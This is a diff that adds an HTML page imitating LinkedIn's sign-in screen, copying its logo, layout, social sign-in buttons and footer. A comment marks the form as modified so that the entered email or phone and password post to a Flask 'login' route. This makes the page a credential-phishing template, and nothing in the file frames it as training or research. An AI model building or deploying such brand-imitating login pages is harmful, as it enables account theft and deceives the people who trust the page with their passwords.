@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Sign In</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 16px 20px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            height: 40px;
+            margin-bottom: 12px;
+        }
+
+        .linkedin-logo {
+            height: 26px;
+            width: auto;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #000000e0;
+            margin-bottom: 20px;
+        }
+
+        .subtitle a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* SSO Buttons Top */
+        .social-buttons {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-social {
+            width: 100%;
+            height: 48px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            background-color: #ffffff;
+            color: #292929;
+            border: 1px solid #666666;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .btn-social:hover {
+            background-color: #f3f3f3;
+            border-color: #000000;
+        }
+
+        .social-svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .terms-text {
+            font-size: 12px;
+            color: #666666;
+            line-height: 16px;
+            margin-top: 16px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .terms-text a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 8px 0 20px 0;
+            color: #666666;
+            font-size: 14px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .divider span {
+            padding: 0 12px;
+        }
+
+        /* Form Styling */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            width: 100%;
+        }
+
+        .input-label {
+            font-size: 14px;
+            color: #000000e0;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 52px;
+            padding: 0 12px;
+            border: 1px solid #000000e0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background-color: #ffffff;
+            color: #000000;
+        }
+
+        .input-field:focus {
+            border: 2px solid #0a66c2;
+            padding: 0 11px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000000e0;
+        }
+
+        .forgot-link {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0a66c2;
+            text-decoration: none;
+            margin-top: 4px;
+            display: inline-block;
+        }
+
+        /* Checkbox */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 4px;
+            font-size: 14px;
+            color: #000000e0;
+        }
+
+        .custom-checkbox {
+            width: 20px;
+            height: 20px;
+            border-radius: 3px;
+            accent-color: #057642;
+            cursor: pointer;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 48px;
+            background-color: #0a66c2;
+            border: none;
+            border-radius: 24px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #004182;
+        }
+
+        /* Footer Links */
+        .footer {
+            margin-top: 40px;
+            width: 100%;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            font-size: 12px;
+            color: #666666;
+            padding-bottom: 16px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            line-height: 18px;
+        }
+
+        .footer-links a {
+            color: #666666;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .language-dropdown {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            color: #666666;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <svg class="linkedin-logo" viewBox="0 0 112 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M7.7 9.5H1.4V27.5H7.7V9.5Z" fill="#0A66C2"/>
+            <path d="M4.6 1.8C2.5 1.8 0.8 3.5 0.8 5.6C0.8 7.7 2.5 9.4 4.6 9.4C6.7 9.4 8.4 7.7 8.4 5.6C8.4 3.5 6.7 1.8 4.6 1.8Z" fill="#0A66C2"/>
+            <path d="M18.8 9.5H12.7V27.5H18.8V18.1C18.8 13.1 25.3 12.6 25.3 18.1V27.5H31.5V16C31.5 7.1 21.3 7.4 18.8 12V9.5Z" fill="#0A66C2"/>
+            <path d="M38.5 2.5H33.8V27.5H38.5V2.5Z" fill="#0A66C2"/>
+            <path d="M49.2 18.1C44.7 18.1 43.6 15.6 43.6 13.5H55.4C55.4 6.7 51.4 2.5 44.4 2.5C37.6 2.5 33.1 8 33.1 15.2C33.1 22.1 37.8 27.9 45 27.9C49.9 27.9 53.2 25.3 54.8 21.5H49.2C48.2 23.3 46 23.9 44.4 23.9C41.3 23.9 39.5 22.2 39.5 18.1H49.2ZM44.2 6.5C46.8 6.5 48.4 8.1 48.6 10.4H39.8C40.2 8.1 41.8 6.5 44.2 6.5Z" fill="#000000"/>
+            <path d="M64 2.5V12.1L58.2 2.5H53.1V27.5H57.8V17.9L63.6 27.5H68.7V2.5H64Z" fill="#000000"/>
+        </svg>
+    </header>
+
+    <main class="main-container">
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">New to LinkedIn? <a href="#">Join now</a></p>
+
+        <div class="social-buttons">
+            <button class="btn-social">
+                <svg class="social-svg" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.14h6.6c-.28 1.52-1.13 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-8.8z"/>
+                    <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.26v3.15C3.25 21.3 7.31 24 12 24z"/>
+                    <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.26C.46 8.17 0 9.99 0 12s.46 3.83 1.26 5.42l4.02-3.15z"/>
+                    <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.26 6.58l4.02 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
+                </svg>
+                Continue with Google
+            </button>
+
+            <button class="btn-social">
+                <svg class="social-svg" viewBox="0 0 24 24" fill="#000000">
+                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.1c.63-.77 1.06-1.84.94-2.92-.92.04-2.05.62-2.71 1.39-.59.68-1.11 1.78-.97 2.84 1.03.08 2.1-.54 2.74-1.31z"/>
+                </svg>
+                Sign in with Apple
+            </button>
+
+            <button class="btn-social">
+                Sign in with a passkey
+            </button>
+        </div>
+
+        <p class="terms-text">
+            By continuing, you agree to LinkedIn's <a href="#">User Agreement</a>, <a href="#">Privacy Policy</a>, and <a href="#">Cookie Policy</a>.
+        </p>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <div class="input-group">
+                <label class="input-label" for="email">Email or phone</label>
+                <div class="input-wrapper">
+                    <input type="text" id="email" name="username" class="input-field" required />
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label" for="password">Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" class="input-field" required />
+                    <button type="button" class="eye-icon" aria-label="Toggle password visibility">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <div>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="keep-signed-in" class="custom-checkbox" checked />
+                <label for="keep-signed-in">Keep me signed in</label>
+            </div>
+
+            <button type="submit" class="btn-submit">Sign in</button>
+        </form>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">User Agreement</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Community Guidelines</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Copyright Policy</a>
+            <a href="#">Send Feedback</a>
+            <span class="language-dropdown">
+                Language 
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z"/>
+                </svg>
+            </span>
+        </div>
+        <div>LinkedIn Corporation © 2026</div>
+    </footer>
+
+</body>
+</html>
